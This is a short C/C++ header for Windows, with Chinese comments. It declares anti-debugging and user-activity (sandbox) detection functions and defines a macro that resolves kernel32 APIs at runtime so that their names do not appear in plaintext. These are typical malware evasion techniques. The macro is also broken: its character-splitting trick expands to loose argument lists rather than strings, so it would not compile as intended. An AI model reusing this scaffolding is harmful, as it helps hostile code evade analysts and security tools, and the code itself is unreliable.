// security_checks.h
#ifndef SECURITY_CHECKS_H
#define SECURITY_CHECKS_H

#include <windows.h>

// 反调试检测函数声明 (使用下划线命名)
BOOL anti_debug();

// 用户行为检测函数声明 (使用下划线命名)
BOOL check_user_activity();

// 在 security_checks.h 添加
#define DYNCALL(func, ...) \
    ( (decltype(&func))GetProcAddress(LoadLibraryA( \
        CHAR_SPLIT('k','e','r','n','e','l','3','2','.','d','l','l',0) ), \
        CHAR_SPLIT(#func,0) ) ) (__VA_ARGS__)

// 字符串分割宏（避免明文API）
#define CHAR_SPLIT(...) __VA_ARGS__


#endif // SECURITY_CHECKS_H